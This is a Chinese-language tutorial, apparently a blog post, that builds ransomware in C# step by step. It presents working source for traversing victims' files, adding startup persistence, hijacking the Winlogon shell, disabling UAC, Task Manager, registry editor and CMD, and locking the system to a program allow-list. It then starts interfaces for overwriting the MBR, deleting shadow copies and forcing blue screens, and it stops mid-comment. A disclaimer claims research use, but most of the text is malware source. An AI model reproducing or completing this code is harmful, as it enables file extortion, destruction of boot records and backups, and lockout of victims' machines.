**免责声明：本项目仅作技术探讨与研究用途，严禁将相关代码用于任何非法活动，否则后果自负**
# 1. 引言
在数字信息飞速发展的今天，勒索软件给无数个人和企业带来了巨大的损失。它利用系统的漏洞，加密重要文件，然后以解密为要挟索要高额赎金。这次，我将用 C# 编写出勒索软件，给大家深度解析这类恶意程序的运作机制，从而为网络安全防护提供更具针对性的思路。
# 2. 技术准备
## 2.1 编程语言基础巩固

 - C#语法规则：对 C# 语言的语法规则进行全面复习，包括变量声明、数据类型转换、流程控制语句（如 `if - else、for、while`循环）等基础内容。确保能够熟练运用这些语法构建各类逻辑结构，为后续编写复杂功能模块打下坚实基础。 
  - 面向对象编程(OOP)：深入学习 C#面向对象编程特性，如类、对象、继承、多态、封装等。勒索软件项目中，文件操作、加密解密、用户交互以及系统操作等功能模块都将以类的形式进行组织，通过合理运用面向对象编程特性，能够使代码结构更加清晰、可维护性更强。

## 2.2 核心技术知识储备

 - **文件操作：**除了掌握 C#中基本的`File`和`Directory`类的使用，还要深入理解文件流的概念与操作。文件流是对文件进行读写操作的关键，在加密和解密文件过程中，需要借助文件流实现数据的按字节读取和写入。例如，使用FileStream类打开文件，设置合适的读写模式和缓冲区大小，以提高文件操作的效率。同时，要了解不同文件类型的结构特点，这有助于在文件遍历过程中准确识别目标文件，并在加密时避免破坏文件结构导致文件永久损坏。
 - **加密算法：**深入研究常见加密算法原理，如 AES（高级加密标准）、RSA（一种非对称加密算法）。AES 算法以其高效的加密性能和安全性，在勒索软件加密文件过程中被广泛应用。需要掌握 AES 算法的工作模式（如 `CBC、ECB、CTR` 等），理解不同模式的优缺点以及适用场景。对于 RSA 算法，要明白其公钥加密、私钥解密的非对称特性，以及在密钥交换和数字签名方面的应用。在项目中，可能会结合 AES 和 RSA 算法的优势，例如使用 RSA 加密 AES 密钥，确保密钥在传输和存储过程中的安全性。
 - **系统操作：**熟悉 C# 对系统层面的操作方法。在进程管理方面，学会使用`System.Diagnostics`命名空间下的`Process`类来启动、停止、监控进程。比如，若要防止用户通过结束进程来阻止勒索软件运行，可利用该类实时监测特定进程状态并重新启动被关闭的进程。在注册表操作上，掌握`Microsoft.Win32.Registry`类及其相关方法，了解如何读取、写入和修改注册表键值。勒索软件可能会利用注册表来实现自启动等功能，通过修改注册表中的特定键值，确保每次系统开机时勒索软件自动运行，增加攻击的持续性。此外，还要了解系统环境变量的操作，能通过 C# 代码获取和修改系统环境变量，这在设置程序运行路径、配置相关参数等方面有重要作用。
## 2.3 开发工具配置
 - **安装并熟悉主流的 C# 开发工具：**`Visual Studio` 提供了强大的集成开发环境（IDE），包含代码编辑器、调试器、项目管理工具等丰富功能。在安装过程中，确保选择与开发项目需求匹配的版本和组件，例如，如果使用 `Windows Forms` 或 `WPF` 进行用户界面开发，要确保安装相应的开发包。安装完成后，熟悉 `Visual Studio` 的界面布局，掌握如何创建新项目、添加文件、管理项目依赖等基本操作。
 - **配置项目环境：**勒索软件项目需要在特定的.NET 框架版本下运行，根据项目需求和兼容性考虑，选择合适的.NET 框架版本，如果项目需要使用较新的 C# 语言特性和框架功能，可选择较新的.NET 版本；若要考虑与旧系统的兼容性，则选择较低版本的.NET 框架。我这里推荐使用`.NET Framework 4.7.2`。
# 3. 项目代码构建与实现
## 3.1 `VortexSecOps` 框架编写
### 3.1.1 文件遍历模块

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace VortexSecOps
{
    namespace FileTraversalService
    {
        public interface IFileTraverser
        {
            /// <summary>
            /// 遍历该目录中的所有文件
            /// </summary>
            /// <param name="filepath">要遍历的目录</param>
            /// <returns>文件的完整路径</returns>
            IEnumerable<string> TraverseFile(string filepath);
            /// <summary>
            /// 遍历该目录中所有指定扩展名的文件
            /// </summary>
            /// <param name="filepath">要遍历的目录</param>
            /// <param name="searchString">搜索字符串，如"*.txt"</param>
            /// <returns>文件的完整路径</returns>
            IEnumerable<string> TraverseFile(string filepath, string searchString);
        }

        // 实现文件遍历接口的类
        public class FileTraverser : IFileTraverser
        {
            // 私有构造，防止外部实例化
            private FileTraverser() { }

            // 创建 FileTraverser 实例
            public static IFileTraverser Create()
            {
                return new FileTraverser();
            }

            // 遍历指定目录下所有文件
            IEnumerable<string> IFileTraverser.TraverseFile(string filepath)
            {
                // 存储待遍历目录
                Stack<string> pendingPaths = new Stack<string>();
                pendingPaths.Push(filepath);

                while (pendingPaths.Count > 0)
                {
                    string currentPath = pendingPaths.Pop();
                    string[] matchingFiles = null;
                    string[] subDirectories = null;

                    try
                    {
                        // 获取当前目录下所有文件
                        matchingFiles = Directory.GetFiles(currentPath);
                    }
                    catch (Exception) { }

                    try
                    {
                        // 获取当前目录下所有子目录
                        subDirectories = Directory.GetDirectories(currentPath);
                    }
                    catch (Exception) { }

                    if (matchingFiles != null)
                    {
                        // 返回文件路径
                        foreach (string file in matchingFiles)
                        {
                            yield return file;
                        }
                    }

                    if (subDirectories != null)
                    {
                        // 压入子目录
                        foreach (string subDirectoryPath in subDirectories)
                        {
                            if((Path.GetFileName(subDirectoryPath) == "Microsoft")&&(Path.GetFileName(Path.GetDirectoryName(subDirectoryPath)) != "Roaming") ||Path.GetFileName(subDirectoryPath)== "Microsoft.NET"||Path.GetFileName(subDirectoryPath)== "Windows NT")
                            {
                                continue; 
                            }
                            pendingPaths.Push(subDirectoryPath);
                        }
                    }
                }
            }

            // 遍历指定目录下指定扩展名文件
            IEnumerable<string> IFileTraverser.TraverseFile(string filepath, string searchString)
            {
                // 存储待遍历目录
                var pendingPaths = new Stack<string>();
                pendingPaths.Push(filepath);

                while (pendingPaths.Count > 0)
                {
                    string currentPath = pendingPaths.Pop();
                    string[] matchingFiles = null;
                    string[] subDirectories = null;

                    try
                    {
                        // 获取匹配文件
                        matchingFiles = Directory.GetFiles(currentPath, searchString);
                    }
                    catch (Exception) { }

                    try
                    {
                        // 获取子目录
                        subDirectories = Directory.GetDirectories(currentPath);
                    }
                    catch (Exception) { }

                    if (matchingFiles != null)
                    {
                        // 返回匹配文件路径
                        foreach (string file in matchingFiles)
                        {
                            yield return file;
                        }
                    }

                    if (subDirectories != null)
                    {
                        // 压入子目录
                        foreach (string subDirectoryPath in subDirectories)
                        {
                            if ((Path.GetFileName(subDirectoryPath) == "Microsoft") && (Path.GetFileName(Path.GetDirectoryName(subDirectoryPath)) != "Roaming") || Path.GetFileName(subDirectoryPath) == "Microsoft.NET" || Path.GetFileName(subDirectoryPath) == "Windows NT")
                            {
                                continue;
                            }
                            pendingPaths.Push(subDirectoryPath);
                        }
                    }
                }
            }
        }
    }
}
```
#### 1、接口定义

 - `IFileTraverser` 接口用于定义文件遍历操作，包含两个方法：
 	-  第一个 `TraverseFile` 方法接收一个目录路径作为参数，用于遍历该目       录下的所有文件，并返回包含所有文件完整路径的可枚举集合。
    - 第二个 `TraverseFile` 方法除接收目录路径外，还接收一个搜索字符串（如 “*.txt”），用于遍历该目录下符合指定扩展名的文件，并返回相应文件的完整路径集合。
#### 2、实现类 `FileTraverser`
 - `FileTraverser` 类实现了 `IFileTraverser` 接口：
      - 其构造函数为私有，防止外部代码直接实例化该类。
      - 提供静态方法 `Create` 用于创建 `FileTraverser` 类的实例，并返回实现了 `IFileTraverser` 接口的对象
#### 3、遍历所有文件的方法实现
- 使用栈存储待遍历的目录路径，初始时将传入的目录路径压入栈中。
- 通过 while 循环，当栈中有待遍历的目录时，从栈中弹出一个目录进行处理。
- 在获取文件和子目录时，使用 try - catch 块捕获可能出现的异常，若出现异常则不做处理，保证程序的健壮性。
- 使用 yield return 关键字逐个返回匹配到的文件路径，实现延迟加载，提高性能。
- 将获取到的子目录路径压入栈中，以便后续继续遍历。
### 3.1.2 注册表配置模块
为了限制用户，勒索病毒通常会修改注册表。
```csharp
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace VortexSecOps
{
    namespace Regedit_Set
    {
        public interface IRegistryConfigurer
        {
            /// <summary>
            /// 判断文件是否被加密
            /// </summary>
            /// <param name="createEncryped">true 标记为加密，默认为false</param>
            /// <returns>true为已加密，false为未加密</returns>
            bool IsDataEncryptedByAes(bool createEncryped = false);
            /// <summary>
            /// 从 Windows 注册表的开机启动项中移除指定的应用程序。
            /// </summary>
            /// <param name="appName">要从开机启动项中移除的应用程序的名称。
            /// 该名称应与之前添加到开机启动项时使用的名称一致。</param>
            void RemoveFromStartup(string appName);
            /// <summary>
            /// 将指定的应用程序添加到 Windows 注册表的开机启动项中。
            /// </summary>
            /// <param name="appName">要添加到开机启动项的应用程序的名称。
            /// 此名称将显示在注册表的开机启动项列表中。</param>
            /// <param name="appPath">要添加到开机启动项的应用程序的完整路径。
            /// 该路径应指向应用程序的可执行文件。</param>
            void AddToStartup(string appName, string appPath);
            /// <summary>
            /// 根据传入的参数值，禁用或启用系统的命令提示符（CMD）。
            /// </summary>
            /// <param name="configValue">用于配置 CMD 状态的整数值。2 表示完全禁用，0 表示启用。</param>
            void ConfigureCMD(int configValue);
            /// <summary>
            /// 禁用注册表编辑器
            /// </summary>
            /// <param name="disableFlag">决定状态的标志，默认值为 1（禁用）</param>
            void DisableRegistryEdit(int disableFlag = 1);
            /// <summary>
            /// 禁用控制面板和任务管理器
            /// </summary>
            /// <param name="disableFlag">决定状态的标志，默认值为 1（禁用）</param>
            void DisableSysSettings(int disableFlag = 1);
            /// <summary>
            /// 根据布尔值启用或禁用 Windows 功能限制
            /// </summary>
            /// <param name="enableRestriction">是否启用限制的布尔值</param>
            void ApplyWinRestricts(bool enableRestriction);
            /// <summary>
            /// 配置启动程序
            /// </summary>
            /// <param name="startupProgram">要设置的启动程序名称</param>
            void ConfigStartupProg(string startupProgram);

            /// <summary>
            /// 关闭用户账户控制（UAC）
            /// </summary>
            void DisableUAC();
        }

        // 操作Windows注册表以调整系统设置
        public class RegistryConfigurer : IRegistryConfigurer
        {
            // 禁用控制面板和任务管理器，参数a决定状态，默认禁用
            private RegistryConfigurer() { }
            public static IRegistryConfigurer Create()
            {
                return new RegistryConfigurer();
            }
            void IRegistryConfigurer.DisableSysSettings(int disableFlag)
            {
                RegistryKey currentUserKey = null;
                RegistryKey controlPanelKey = null;
                RegistryKey taskManagerKey = null;
                const string EXPLORER_POLICIES_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer";
                const string SYSTEM_POLICIES_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
                try
                {
                    currentUserKey = Registry.CurrentUser;
                    controlPanelKey = currentUserKey.CreateSubKey(EXPLORER_POLICIES_PATH);
                    controlPanelKey.SetValue("NoControlPanel", disableFlag);
                    taskManagerKey = currentUserKey.CreateSubKey(SYSTEM_POLICIES_PATH);
                    taskManagerKey.SetValue("DisableTaskMgr", disableFlag);
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (taskManagerKey != null)
                    {
                        taskManagerKey.Close();
                    }
                    if (controlPanelKey != null)
                    {
                        controlPanelKey.Close();
                    }
                    if (currentUserKey != null)
                    {
                        currentUserKey.Close();
                    }
                }
            }

            // 禁用注册表编辑器，参数disableFlag决定状态，默认禁用
            void IRegistryConfigurer.DisableRegistryEdit(int disableFlag)
            {
                RegistryKey currentUserKey = null;
                RegistryKey systemPoliciesKey = null;
                try
                {
                    currentUserKey = Registry.CurrentUser;
                    const string System = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
                    systemPoliciesKey = currentUserKey.OpenSubKey(System, true);
                    if (systemPoliciesKey == null)
                    {
                        systemPoliciesKey = currentUserKey.CreateSubKey(System);
                    }
                    systemPoliciesKey.SetValue("DisableRegistryTools", disableFlag);
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (systemPoliciesKey != null)
                    {
                        systemPoliciesKey.Close();
                    }
                    if (currentUserKey != null)
                    {
                        currentUserKey.Close();
                    }
                }
            }

            // 关闭用户账户控制（UAC）
            void IRegistryConfigurer.DisableUAC()
            {
                // 定义注册表中 System 策略子键的路径常量
                const string SYSTEM_POLICIES_PATH = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
                // 定义要设置的注册表值名称常量，用于控制 UAC 功能
                const string ENABLE_LUA_VALUE_NAME = "EnableLUA";

                RegistryKey localMachineKey = null;
                RegistryKey systemPoliciesKey = null;
                try
                {
                    // 打开当前用户的注册表根键
                    localMachineKey = Registry.LocalMachine;
                    // 尝试以可写方式打开 System 策略子键
                    systemPoliciesKey = localMachineKey.OpenSubKey(SYSTEM_POLICIES_PATH, true);
                    // 若子键不存在，则创建该子键
                    if (systemPoliciesKey == null)
                    {
                        systemPoliciesKey = localMachineKey.CreateSubKey(SYSTEM_POLICIES_PATH);
                    }
                    // 将 EnableLUA 的值设置为 0，以关闭 UAC
                    systemPoliciesKey.SetValue(ENABLE_LUA_VALUE_NAME, 0);
                }
                catch (Exception)
                { }
                finally
                {
                    // 若 software 子键已打开，则关闭它
                    if (systemPoliciesKey != null)
                    {
                        systemPoliciesKey.Close();
                    }
                    // 若当前用户根键已打开，则关闭它
                    if (localMachineKey != null)
                    {
                        localMachineKey.Close();
                    }
                }
            }
            void IRegistryConfigurer.ConfigStartupProg(string startupProgram)
            {
                // Winlogon 注册表子键路径常量
                const string WINLOGON_SUBKEY_PATH = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
                // 注册表值名称常量
                const string SHELL_VALUE_NAME = "Shell";

                RegistryKey localMachineKey = null;
                RegistryKey winlogonKey = null;
                try
                {
                    // 打开 HKEY_LOCAL_MACHINE 根键
                    localMachineKey = Registry.LocalMachine;
                    // 尝试打开 Winlogon 子键
                    winlogonKey = localMachineKey.OpenSubKey(WINLOGON_SUBKEY_PATH, true);
                    // 若不存在则创建
                    if (winlogonKey == null)
                    {
                        winlogonKey = localMachineKey.CreateSubKey(WINLOGON_SUBKEY_PATH);
                    }
                    // 设置 Shell 值
                    winlogonKey.SetValue(SHELL_VALUE_NAME, startupProgram);
                }
                finally
                {
                    // 关闭子键
                    if (winlogonKey != null)
                    {
                        winlogonKey.Close();
                    }
                    // 关闭根键
                    if (localMachineKey != null)
                    {
                        localMachineKey.Close();
                    }
                }
            }

            // 根据布尔值enableRestriction启用或禁用Windows功能限制
            void IRegistryConfigurer.ApplyWinRestricts(bool enableRestriction)
            {
                RegistryKey currentUserKey = null;
                RegistryKey explorerPoliciesKeyForRestrictRun = null;
                RegistryKey explorerPoliciesKeyForAllowedProgs = null;
                const string WINDOWS_EXPLORER_POLICIES_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer";
                if (enableRestriction)
                {
                    try
                    {
                        currentUserKey = Registry.CurrentUser;
                        explorerPoliciesKeyForRestrictRun = currentUserKey.CreateSubKey(WINDOWS_EXPLORER_POLICIES_PATH);
                        explorerPoliciesKeyForRestrictRun.SetValue("RestrictRun", 1);
                        explorerPoliciesKeyForAllowedProgs = currentUserKey.CreateSubKey($"{WINDOWS_EXPLORER_POLICIES_PATH}\\RestrictRun");
                        // 添加允许运行的程序列表
                        string[] allowedPrograms = {
                    Process.GetCurrentProcess().ProcessName + ".exe",
                    "msedge.exe",
                    "WeChat.exe",
                    "shutdown.exe",
                    "ReAgentc.exe",
                    "Rundl132.exe",
                    "@Vortex_decryptor.exe",
                    "notepad.exe"
                    };
                        foreach (string program in allowedPrograms)
                        {
                            explorerPoliciesKeyForAllowedProgs.SetValue(program, program);
                        }
                    }
                    catch (Exception)
                    {
                    }
                    finally
                    {
                        if (explorerPoliciesKeyForRestrictRun != null)
                        {
                            explorerPoliciesKeyForRestrictRun.Close();
                        }
                        if (explorerPoliciesKeyForAllowedProgs != null)
                        {
                            explorerPoliciesKeyForAllowedProgs.Close();
                        }
                        if (currentUserKey != null)
                        {
                            currentUserKey.Close();
                        }
                    }
                }
                else
                {
                    try
                    {
                        currentUserKey = Registry.CurrentUser;
                        explorerPoliciesKeyForRestrictRun = currentUserKey.CreateSubKey(WINDOWS_EXPLORER_POLICIES_PATH);
                        explorerPoliciesKeyForRestrictRun.DeleteValue("RestrictRun");
                    }
                    catch (Exception)
                    {

                    }
                    finally
                    {
                        if (explorerPoliciesKeyForRestrictRun != null)
                        {
                            explorerPoliciesKeyForRestrictRun.Close();
                        }
                        if (currentUserKey != null)
                        {
                            currentUserKey.Close();
                        }
                    }
                }
            }
            void IRegistryConfigurer.ConfigureCMD(int configValue)
            {
                const string registryPath = @"Software\Policies\Microsoft\Windows\System";
                const string registryValueName = "DisableCMD";
                RegistryKey cmdRegistryKey = null;
                try
                {
                    cmdRegistryKey = Registry.CurrentUser.OpenSubKey(registryPath, true);
                    if (cmdRegistryKey == null)
                    {
                        cmdRegistryKey = Registry.CurrentUser.CreateSubKey(registryPath);
                    }
                    cmdRegistryKey.SetValue(registryValueName, configValue, RegistryValueKind.DWord);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                finally
                {
                    if (cmdRegistryKey != null)
                    {
                        cmdRegistryKey.Close();
                    }
                }
            }
            void IRegistryConfigurer.AddToStartup(string appName, string appPath)
            {
                const string startupRegistryPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                RegistryKey registryKey = null;
                try
                {
                    registryKey = Registry.LocalMachine.OpenSubKey(startupRegistryPath, true);
                    if (registryKey == null)
                    {
                        registryKey = Registry.LocalMachine.CreateSubKey(startupRegistryPath);
                    }
                    registryKey.SetValue(appName, appPath, RegistryValueKind.String);
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (registryKey != null)
                    {
                        registryKey.Close();
                    }
                }
            }
            void IRegistryConfigurer.RemoveFromStartup(string appName)
            {
                const string startupRegistryPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                RegistryKey registryKey = null;
                try
                {
                    registryKey = Registry.LocalMachine.OpenSubKey(startupRegistryPath, true);
                    if (registryKey != null && registryKey.GetValue(appName) != null)
                    {
                        registryKey.DeleteValue(appName);
                    }
                }
                catch (Exception)
                {

                }
                finally
                {
                    if (registryKey != null)
                    {
                        registryKey.Close();
                    }
                }
            }
            bool IRegistryConfigurer.IsDataEncryptedByAes(bool createEncryped)
            {
                RegistryKey localMachineKey = null;
                RegistryKey encrypted = null;
                string appName = "VortexCrypt";
                string encryptedFlagValueName = "FilesEncrypted";
                const int hexValue = 346892;

                if (Environment.Is64BitProcess)
                {
                    try
                    {
                        localMachineKey = Registry.LocalMachine;
                        encrypted = localMachineKey.CreateSubKey($"SOFTWARE\\{appName}");
                        object value = encrypted.GetValue(encryptedFlagValueName);
                        if (value == null || Convert.ToInt32(value) != hexValue)
                        {
                            if (createEncryped == true)
                            {
                                encrypted.SetValue(encryptedFlagValueName, hexValue, RegistryValueKind.DWord);
                            }
                            return false;
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return false;
                    }
                    finally
                    {
                        if (encrypted != null)
                        {
                            encrypted.Close();
                        }
                        if (localMachineKey != null)
                        {
                            localMachineKey.Close();
                        }
                    }
                }
                else
                {
                    try
                    {
                        localMachineKey = Registry.LocalMachine;
                        encrypted = localMachineKey.CreateSubKey($"SOFTWARE\\WOW6432Node\\{appName}");
                        object value = encrypted.GetValue(encryptedFlagValueName);
                        if (value == null || Convert.ToInt32(value) != hexValue)
                        {
                            if (createEncryped == true)
                            {
                                encrypted.SetValue(encryptedFlagValueName, hexValue, RegistryValueKind.DWord);
                            }
                            return false;
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return false;
                    }
                    finally
                    {
                        if (encrypted != null)
                        {
                            encrypted.Close();
                        }
                        if (localMachineKey != null)
                        {
                            localMachineKey.Close();
                        }
                    }
                }
                return true;
            }
        }
    }
}
```
 #### 1. 接口定义 
 `IRegistryConfigurer` 接口定义了一系列用于注册表操作的方法，提供对系统不同设置进行配置的抽象接口，具体方法如下：

| **方法名称**               | **功能描述**                                                                 |
|----------------------------|-----------------------------------------------------------------------------|
| `IsDataEncryptedByAes`     | 检查数据是否通过 AES 加密，可选择创建加密标志。                              |
| `RemoveFromStartup`        | 从开机启动项中移除指定应用程序。                                            |
| `AddToStartup`             | 将应用程序添加到开机启动项。                                                |
| `ConfigureCMD`             | 根据传入参数禁用或启用系统命令提示符（CMD）。                                |
| `DisableRegistryEdit`      | 禁用注册表编辑器。                                                          |
| `DisableSysSettings`       | 禁用控制面板和任务管理器。                                                  |
| `ApplyWinRestricts`        | 应用 Windows 功能限制（启用/禁用）。                                         |
| `DisableUAC`               | 关闭用户账户控制（UAC）。                                                    |
| `ConfigStartupProg`        | 配置启动程序。                                                              |


> #### 2. 类的实现：`RegistryConfigurer`
> ##### 2.1 单例模式设计
> - **私有构造函数**：防止外部直接实例化。
> - **静态 `Create` 方法**：用于创建类的实例，实现单例模式变体。
> 
> 
> #### 2.2 关键功能实现细节
> ##### 2.2.1 开机启动项管理
> - **`AddToStartup` 方法**  
>   - 操作路径：`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
> 
>   - 功能：打开注册表项，将指定应用程序路径以指定名称添加为开机启动项。
> 
> - **`RemoveFromStartup` 方法**  
>   - 操作路径：同上  
>   - 功能：检查注册表项中是否存在指定名称的应用程序，若存在则删除。
> 
> 
> ##### 2.2.2 系统工具禁用
> - **`DisableRegistryEdit` 方法**  
>   - 操作路径：`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System`
> 
>   - 功能：创建或修改 `DisableRegistryTools` 值以禁用注册表编辑器。
> 
> - **`DisableSysSettings` 方法**  
>   - 操作路径 1：`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
> 
>     - 功能：创建或修改 `NoControlPanel` 值禁用控制面板。  
>   - 操作路径 2：`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System`
> 
>     - 功能：创建或修改 `DisableTaskMgr` 值禁用任务管理器。
> 
> 
> ##### 2.2.3 用户账户控制（UAC）关闭
> - **`DisableUAC` 方法**  
>   - 操作路径：`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
> 
>   - 功能：创建或修改 `EnableLUA` 值为 `0`，关闭 UAC。
> 
> 
> ##### 2.2.4 Windows 功能限制
> - **`ApplyWinRestricts` 方法**  
>   - 操作路径：`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
> 
>   - **逻辑**：  
>     - 当 `enableRestriction` 为 `true` 时：  
>       - 创建或修改 `RestrictRun` 值为 `1` 启用限制。  
>       - 在 `RestrictRun` 子项中添加允许运行的程序列表。  
>     - 当 `enableRestriction` 为 `false` 时：  
>       - 删除 `RestrictRun` 值取消限制。
> 
> 
> ##### 2.2.5 命令提示符（CMD）配置
> - **`ConfigureCMD` 方法**  
>   - 操作路径：`HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System`  
>   - 功能：根据 `configValue` 参数配置 CMD 状态：  
>     - `2`：完全禁用  
>     - `0`：启用
> 
> 
> #### 2.2.6 数据加密检查
> - **`IsDataEncryptedByAes` 方法**  
>   - **逻辑**：  
>     1. 根据当前进程是否为 64 位，选择注册表路径：  
>        - 64 位进程：`HKEY_LOCAL_MACHINE\SOFTWARE`  
>        - 32 位进程：`HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node`  
>     2. 查找指定应用程序（`VortexCrypt`）的注册表项，检查 `FilesEncrypted` 值是否等于特定值。  
>     3. 若值不存在或不匹配，且 `createEncrypted` 参数为 `true`，则创建该值并设置为指定值。
### 3.1.3 系统操作模块
为了增强破坏性和威胁性，勒索病毒可通过多个底层的高危操作，胁迫用户尽快支付赎金。下面这些代码写出了勒索病毒是如何进一步破坏系统的
```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows.Forms;
using HANDLE = System.IntPtr;

namespace VortexSecOps
{
    namespace HarmfulSysHacks
    {
        /// <summary>
        /// Windows API 常量
        /// </summary>
        public enum Windows_API_Constants : uint
        {
            // 文件共享模式
            /// <summary>
            /// 文件共享读取模式
            /// </summary>
            File_Share_Read = 0x00000001,
            /// <summary>
            /// 文件共享写入模式
            /// </summary>
            File_Share_Write = 0x00000002,

            // 文件访问权限
            /// <summary>
            /// 通用读取访问权限
            /// </summary>
            Generic_Read = 0x80000000,
            /// <summary>
            /// 通用写入访问权限
            /// </summary>
            Generic_Write = 0x40000000,

            // 文件创建操作
            /// <summary>
            /// 打开已存在的文件
            /// </summary>
            Open_Existing = 3,
        }
        /// <summary>
        /// 定义了与 Windows API 操作相关的接口，继承自 <see cref="IConfigCorrupter"/> 接口。
        /// </summary>
        public interface IWindowsAPIOperator : IConfigCorrupter
        {
            bool CloseHandle(HANDLE hObject);
            /// <summary>
            /// 将数据写入指定的文件或输入/输出（I/O）设备。
            /// </summary>
            /// <param name="hFile">要写入数据的文件句柄。</param>
            /// <param name="lpBuffer">指向包含要写入数据的缓冲区的指针。</param>
            /// <param name="nNumberOfBytesToWrite">要从缓冲区写入的字节数。</param>
            /// <param name="lpNumberOfBytesWritten">指向一个变量的指针，该变量用于接收实际写入的字节数。</param>
            /// <param name="lpOverlapped">指向OVERLAPPED结构的指针（若适用）。</param>
            /// <returns>
            /// 函数如果成功，则返回true；函数如果失败，则返回false。
            /// </returns>
            bool WriteFile(HANDLE hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);
            /// <summary>
            /// 创建或打开文件或I/O设备。
            /// </summary>
            /// <param name="lpFileName">要创建或打开的文件或设备的名称。</param>
            /// <param name="dwDesiredAccess">对文件或设备期望的访问权限。</param>
            /// <param name="dwShareMode">文件或设备的共享模式。</param>
            /// <param name="lpSecurityAttributes">指向SECURITY_ATTRIBUTES结构的指针，用于确定文件或设备的安全属性。</param>
            /// <param name="dwCreationDisposition">当文件或设备存在与否时应采取的操作。</param>
            /// <param name="dwFlagsAndAttributes">文件或设备的属性及标志。</param>
            /// <param name="hTemplateFile">指向模板文件的句柄（若适用）。</param>
            /// <returns></returns>
            HANDLE CreateFileA(string lpFileName, Windows_API_Constants dwDesiredAccess, Windows_API_Constants dwShareMode, uint lpSecurityAttributes, Windows_API_Constants dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
            /// <summary>
            /// 从指定的文件或输入/输出（I/O）设备读取数据。 如果设备支持，则读取发生在文件指针指定的位置。
            /// </summary>
            /// <param name="hFile">设备的句柄（例如文件、文件流、物理磁盘、卷、控制台缓冲区、磁带驱动器、套接字、通信资源、mailslot 或管道）。</param>
            /// <param name="lpBuffer">指向接收从文件或设备读取的数据的缓冲区的指针。</param>
            /// <param name="nNumberOfBytesToRead">要读取的最大字节数。</param>
            /// <param name="lpNumberOfBytesRead">指向使用同步 hFile 参数时接收读取的字节数的变量的指针。</param>
            /// <param name="lpOverlapped">
            /// 指向 <see cref="OVERLAPPED"/> 结构体的指针
            /// </param>
            /// <returns>
            /// 如果函数成功，返回值为非零值（表示 <c>true</c>）。
            /// 如果函数失败，返回值为零（表示 <c>false</c>）。
            /// </returns>
            bool ReadFile(HANDLE hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, ref uint lpNumberOfBytesRead, IntPtr lpOverlapped);
            /// <summary>
            /// 修改主引导记录（MBR）。
            /// </summary>
            /// <returns>如果修改成功，返回 <c>true</c>；否则返回 <c>false</c>。</returns>
            bool ModifyMasterBootRecord();
            /// <summary>
            /// 将指定的字节数组数据写入主引导记录（MBR）。
            /// </summary>
            /// <param name="buffer">要写入 MBR 的字节数组数据。</param>
            /// <returns>如果写入成功，返回 <c>true</c>；否则返回 <c>false</c>。</returns>
            bool WriteToMasterBootRecord(byte[] buffer);
        }
        /// <summary>
        /// 定义了常规操作相关的接口，继承自 <see cref="IConfigCorrupter"/> 接口。
        /// </summary>
        public interface INormalOperator : IConfigCorrupter
        {
            /// <summary>
            /// 修改主引导记录（MBR）。
            /// </summary>
            void ModifyMasterBootRecord();
            /// <summary>
            /// 将指定的字节数组数据写入主引导记录（MBR）。
            /// </summary>
            /// <param name="buffer">要写入 MBR 的字节数组数据。</param>
            void WriteToMasterBootRecord(byte[] buffer);
        }
        /// <summary>
        /// 定义了配置破坏相关操作的接口。
        /// </summary>
        public interface IConfigCorrupter
        {
            /// <summary>
            /// 删除所有卷影副本
            /// </summary>
            void DeleteAllRestorePoints();
            /// <summary>
            /// 触发系统蓝屏。
            /// </summary>
            void TriggerBlueScreen();
            /// <summary>
            /// 禁用 Windows 恢复环境。
            /// </summary>
            void DisableWindowsRecoveryEnvironment();
            /// <summary>
            /// 重启计算机。
            /// </summary>
            void RestartComputer();

        }

        // 此类包含了被恶意程序使用的与系统级别操作相关的多个方法
        public class MalwareIntruder
        {
            // 私有构造函数，防止外部实例化
            private MalwareIntruder() { }
            // 定义 MBR 备份文件的路径
            private const string MBR_PATH = @"C:\bin\mbr.bin";
            /// <summary>
            /// 从指定的文件或输入/输出（I/O）设备读取数据。 如果设备支持，则读取发生在文件指针指定的位置。
            /// </summary>
            /// <param name="hFile">设备的句柄（例如文件、文件流、物理磁盘、卷、控制台缓冲区、磁带驱动器、套接字、通信资源、mailslot 或管道）。</param>
            /// <param name="lpBuffer">指向接收从文件或设备读取的数据的缓冲区的指针。</param>
            /// <param name="nNumberOfBytesToRead">要读取的最大字节数。</param>
            /// <param name="lpNumberOfBytesRead">指向使用同步 hFile 参数时接收读取的字节数的变量的指针。</param>
            /// <param name="lpOverlapped">
            /// 指向 <see cref="OVERLAPPED"/> 结构体的指针
            /// </param>
            /// <returns>
            /// 如果函数成功，返回值为非零值（表示 <c>true</c>）。
